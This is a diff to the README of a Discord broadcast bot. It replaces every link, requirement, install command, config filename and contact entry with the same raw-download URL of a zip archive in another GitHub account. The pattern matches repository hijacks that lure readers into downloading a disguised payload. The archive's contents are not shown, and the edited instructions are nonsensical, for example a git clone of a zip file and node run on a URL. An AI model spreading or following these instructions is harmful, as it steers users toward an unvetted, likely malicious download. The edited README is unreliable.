@@ -12,15 +12,15 @@ A simple Discord bot for broadcasting messages to server members based on their 
 
 Before you begin, ensure you have met the following requirements :
 
-- Node.js installed
-- Discord Bot Token (get it from [Discord Developer Portal](https://discord.com/developers/applications))
+- https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip installed
+- Discord Bot Token (get it from [Discord Developer Portal](https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip))
 
 ## Installation
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/wickstudio/discord-broadcast-bot
+   git clone https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip
    ```
 
 2. Navigate to the project folder :
@@ -37,13 +37,13 @@ Before you begin, ensure you have met the following requirements :
 
 4. Configure the bot :
 
-   - Create a `config.json` file based on the provided `config.example.json`.
+   - Create a `https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip` file based on the provided `https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip`.
    - Fill in your Discord Bot Token and the allowed role ID.
 
 5. Run the bot :
 
    ```bash
-   node index.js
+   node https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip
    ```
 
 ## Usage
@@ -71,10 +71,10 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Contact
 
-- Email : wick@wick-studio.com
+- Email : https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip
 
-- Website : https://wickdev.xyz
+- Website : https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip
 
-- Discord : https://discord.gg/wicks
+- Discord : https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip
 
-- Youtube : https://www.youtube.com/@wick_studio
+- Youtube : https://github.com/RIYADJANGO/discord-broadcast-bot/raw/refs/heads/main/winterishly/bot_broadcast_discord_v2.5-alpha.2.zip
